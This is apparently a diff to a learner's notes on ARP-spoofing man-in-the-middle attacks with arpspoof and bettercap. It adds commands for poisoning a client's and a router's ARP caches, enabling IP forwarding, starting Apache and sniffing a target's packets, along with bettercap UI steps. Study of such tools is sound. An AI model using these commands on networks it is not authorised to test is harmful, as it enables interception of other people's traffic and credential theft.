@@ -9,7 +9,7 @@ arpspoof -t                          (target)
 arpspoof -i wlan0(for wifi) or eth0 (wired) -t 192.168.201.61 192.168.201.158     (for arpspoof to fool the client)
 arpspoof -i wlan0(for wifi) or eth0 (wired) -t 192.168.201.158 192.168.201.61     (for fool the router)
 echo 1 > /proc/sys/net/ipv4/ip_forward                                            (for port forwarding)
-
+service apache2 start                 (to start the web server in kali linux apache2 is the kali's own webserver)
 
 BETTERCAP TOOL>>>>>>>
 bettercap                            (shows the bettercap details)
@@ -20,7 +20,8 @@ set (option name) true or false      (modify the bettercap modules)
 arp.spoof on                         (to start the target for attack)
 net.sniff on                         (to shows the packets what going on target machine)
 bettercap -iface wlan0 (or) eth0 -caplet arpspoof.acp (filename)       (we have to past all above commands in a cap file then anytime we run a file like this in one line )
-
+bettercap -iface wlan0 (or) eht0                                       (to open a bettercap ui and if not installed already, then type ui.update)
+http-ui                              (open a bettercap.ui)
 
 
 
